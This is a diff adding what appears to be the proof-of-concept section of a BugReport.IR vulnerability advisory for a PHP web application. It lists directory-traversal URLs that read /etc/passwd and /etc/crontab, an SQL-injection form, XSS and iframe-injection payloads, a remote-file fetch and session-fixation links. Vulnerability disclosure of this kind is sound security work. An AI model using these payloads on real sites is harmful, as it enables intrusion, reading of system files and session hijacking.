@@ -1,0 +1,31 @@
+ Directory Traversal
+ -------------
+ http://www.example.com/download.php?dfile=../../../../../../etc/passwd
+ http://www.example.com/download.php?dfile=../../../../../../../etc/crontab
+ -------------
+ 
+ SQL Injection 
+ -------------
+ &lt;form action=&quot;http://www.example.com/rating.php&quot; method=&quot;post&quot;&gt;
+ &lt;input type=text name=book_id size=100 value=&quot;[SQL Injection]&quot;&gt;&lt;br&gt;
+ &lt;input type=hidden name=user_score size=100 value=5&gt;
+ &lt;input type=submit name=submit_for_rating value=&quot;Go!&quot;&gt;
+ &lt;/form&gt;
+ -------------
+
+ Cross-site Scripting
+ -------------
+ http://www.example.com/login.php?Fake=&lt;fake&gt;&lt;script&gt;alert(/sdl BugReport.IR xss/)&lt;/script&gt;
+ http://www.example.com/hta/htmlarea.js.php?glb_sid=&lt;script&gt;alert(/sdl BugReport.IR xss/)&lt;/script&gt;
+ http://www.example.com/rss_getfile.php?file=http://BugReport.ir
+
+ First of all, login into the site.
+ Now submit this : &lt;iframe src=&quot;http://www.BugReport.ir/&quot; width=1000 height=1000&gt;&lt;/iframe&gt;
+ at: http://www.example.com/room.php?slc_lang=fa&amp;sid=1&amp;user_id=1
+ -------------
+    
+ Session Fixation
+ -------------
+ First, clear the site&#039;s cookies, and then goto:
+ http://www.example.com/homepg/index.php?PHPSESSID=BugReportIRSessionFixation
+ http://www.example.com/homepg/login.php?PHPSESSID=BugReportIRSessionFixation
